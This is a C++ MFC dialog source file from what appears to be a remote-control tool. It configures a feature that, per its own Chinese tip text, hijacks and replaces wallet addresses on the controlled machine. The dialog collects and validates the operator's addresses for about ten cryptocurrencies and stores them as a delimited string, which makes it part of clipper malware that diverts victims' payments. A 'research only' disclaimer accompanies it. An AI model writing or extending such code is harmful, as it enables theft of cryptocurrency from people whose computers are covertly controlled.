// CWalletDlg.cpp: 实现文件
//

#include "stdafx.h"
#include "CWalletDlg.h"
#include "afxdialogex.h"
#include "Resource.h"
#include "wallet.h"


// CWalletDlg 对话框

IMPLEMENT_DYNAMIC(CWalletDlg, CDialogEx)

CWalletDlg::CWalletDlg(CWnd* pParent /*=nullptr*/)
    : CDialogLangEx(IDD_DIALOG_WALLET, pParent)
{

}

CWalletDlg::~CWalletDlg()
{
}

void CWalletDlg::DoDataExchange(CDataExchange* pDX)
{
    __super::DoDataExchange(pDX);
    DDX_Control(pDX, IDC_EDIT_WALLET_BTC, m_EditBTC);
    DDX_Control(pDX, IDC_EDIT_WALLET_ERC20, m_EditERC20);
    DDX_Control(pDX, IDC_EDIT_WALLET_OMNI, m_EditOMNI);
    DDX_Control(pDX, IDC_EDIT_WALLET_TRC20, m_EditTRC20);
    DDX_Control(pDX, IDC_EDIT_WALLET_SOL, m_EditSOL);
    DDX_Control(pDX, IDC_EDIT_WALLET_XRP, m_EditXRP);
    DDX_Control(pDX, IDC_EDIT_WALLET_ADA, m_EditADA);
    DDX_Control(pDX, IDC_EDIT_WALLET_DOGE, m_EditDOGE);
    DDX_Control(pDX, IDC_EDIT_WALLET_DOT, m_EditDOT);
    DDX_Control(pDX, IDC_EDIT_WALLET_TRON, m_EditTRON);
}


BEGIN_MESSAGE_MAP(CWalletDlg, CDialogEx)
END_MESSAGE_MAP()


// CWalletDlg 消息处理程序


BOOL CWalletDlg::OnInitDialog()
{
    __super::OnInitDialog();
    // 多语言翻译 - Static控件
    SetDlgItemText(IDC_STATIC_WALLET_BTC, _TR("比特币 (BTC):"));
    SetDlgItemText(IDC_STATIC_WALLET_ETHERC20_2394, _TR("ETH-ERC20:"));
    SetDlgItemText(IDC_STATIC_WALLET_USDTOMNI_2395, _TR("USDT-OMNI:"));
    SetDlgItemText(IDC_STATIC_WALLET_USDTTRC20_2396, _TR("USDT-TRC20:"));
    SetDlgItemText(IDC_STATIC_WALLET_TRON_2397, _TR("TRON:"));
    SetDlgItemText(IDC_STATIC_WALLET_Polkadot_2398, _TR("Polkadot:"));
    SetDlgItemText(IDC_STATIC_WALLET_ADA_2399, _TR("ADA:"));
    SetDlgItemText(IDC_STATIC_WALLET_Dogecoin_2400, _TR("Dogecoin:"));
    SetDlgItemText(IDC_STATIC_WALLET_XRP_2401, _TR("XRP:"));
    SetDlgItemText(IDC_STATIC_WALLET_Solana_2402, _TR("Solana:"));
    SetDlgItemText(IDC_STATIC_WALLET_TIP, _TR("提示信息: 劫持并替换被控端钱包地址；总字符数最多是470，只填写所需的地址，不需要全部填满。"));
    SetDlgItemText(IDC_STATIC_WALLET_WARNING, _TR("警告信息: 此功能仅用于开源项目之研究，用户自行承担后果，不得用于非法目的。"));
    SetDlgItemText(IDOK, _TR("确定"));

    auto a = StringToVector(m_str.GetString(), ';', MAX_WALLET_NUM);
    m_EditBTC.SetWindowTextA(a[ADDR_BTC].c_str());
    m_EditERC20.SetWindowTextA(a[ADDR_ERC20].c_str());
    m_EditOMNI.SetWindowTextA(a[ADDR_OMNI].c_str());
    m_EditTRC20.SetWindowTextA(a[ADDR_TRC20].c_str());
    m_EditSOL.SetWindowTextA(a[ADDR_SOL].c_str());
    m_EditXRP.SetWindowTextA(a[ADDR_XRP].c_str());
    m_EditADA.SetWindowTextA(a[ADDR_ADA].c_str());
    m_EditDOGE.SetWindowTextA(a[ADDR_DOGE].c_str());
    m_EditDOT.SetWindowTextA(a[ADDR_DOT].c_str());
    m_EditTRON.SetWindowTextA(a[ADDR_TRON].c_str());

    return TRUE;
}

CString JoinCStringArray(const CString arr[], int size, TCHAR delimiter)
{
    CString result;
    for (int i = 0; i < size; ++i) {
        result += arr[i];
        if (i != size - 1)
            result += delimiter;
    }
    return result;
}

void CWalletDlg::OnOK()
{
    CString a[MAX_WALLET_NUM];
    m_EditBTC.GetWindowTextA(a[ADDR_BTC]);
    m_EditERC20.GetWindowTextA(a[ADDR_ERC20]);
    m_EditOMNI.GetWindowTextA(a[ADDR_OMNI]);
    m_EditTRC20.GetWindowTextA(a[ADDR_TRC20]);
    m_EditSOL.GetWindowTextA(a[ADDR_SOL]);
    m_EditXRP.GetWindowTextA(a[ADDR_XRP]);
    m_EditADA.GetWindowTextA(a[ADDR_ADA]);
    m_EditDOGE.GetWindowTextA(a[ADDR_DOGE]);
    m_EditDOT.GetWindowTextA(a[ADDR_DOT]);
    m_EditTRON.GetWindowTextA(a[ADDR_TRON]);

    for (int i = 0; i < MAX_WALLET_NUM; ++i) {
        if (a[i].IsEmpty()) continue;
        if (WALLET_UNKNOWN == detectWalletType(a[i].GetString())) {
            char tip[100];
            sprintf(tip, "第 %d 个钱包地址不合法!", i + 1);
            MessageBoxL(CString(tip), "提示", MB_ICONINFORMATION);
            return;
        }
    }
    m_str = JoinCStringArray(a, MAX_WALLET_NUM, _T(';'));

    __super::OnOK();
}
